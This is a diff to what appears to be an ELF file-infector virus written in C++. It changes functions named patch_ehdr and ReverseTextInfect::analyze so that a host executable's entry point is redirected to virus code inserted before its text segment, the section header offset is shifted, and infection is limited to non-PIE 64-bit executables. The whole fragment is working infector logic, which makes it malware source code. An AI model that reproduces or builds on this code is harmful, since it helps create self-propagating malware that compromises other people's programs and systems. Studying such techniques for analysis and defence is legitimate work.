@@ -95,18 +95,12 @@ void patch_phdr(const Elf64_Ehdr& ehdr, Elf64_Phdr& phdr,
 void patch_ehdr(Elf64_Ehdr& ehdr, Elf64_Addr original_code_segment_p_vaddr,
                 Elf64_Off original_code_segment_file_offset,
                 uint64_t padded_virus_size) {
-  if (ehdr.e_type == ET_EXEC) {
-    ehdr.e_entry = original_code_segment_p_vaddr - padded_virus_size;
-    // virus inserted after ehdr.
-    if (original_code_segment_file_offset == 0) {
-      ehdr.e_entry += sizeof(Elf64_Ehdr);
-    }
-  } else {
-    vt::printf("DYN not supported\n");
-    CHECK_FAIL();
-    // ehdr.e_entry = info.original_code_segment_file_offset -
-    // padded_virus_size;
+  ehdr.e_entry = original_code_segment_p_vaddr - padded_virus_size;
+  // virus inserted after ehdr.
+  if (original_code_segment_file_offset == 0) {
+    ehdr.e_entry += sizeof(Elf64_Ehdr);
   }
+
   // section header always comes after the virus.
   ehdr.e_shoff += padded_virus_size;
 
@@ -256,8 +250,8 @@ bool ReverseTextInfect::analyze(std::span<const std::byte> host_mapping,
   const auto& ehdr =
       *reinterpret_cast<const Elf64_Ehdr*>(&host_mapping.front());
 
-  if ((ehdr.e_type != ET_EXEC && ehdr.e_type != ET_DYN) ||
-      ehdr.e_ident[EI_CLASS] != ELFCLASS64) {
+  // this algorithm only supports non-pie
+  if (ehdr.e_type != ET_EXEC || ehdr.e_ident[EI_CLASS] != ELFCLASS64) {
     return false;
   }
 
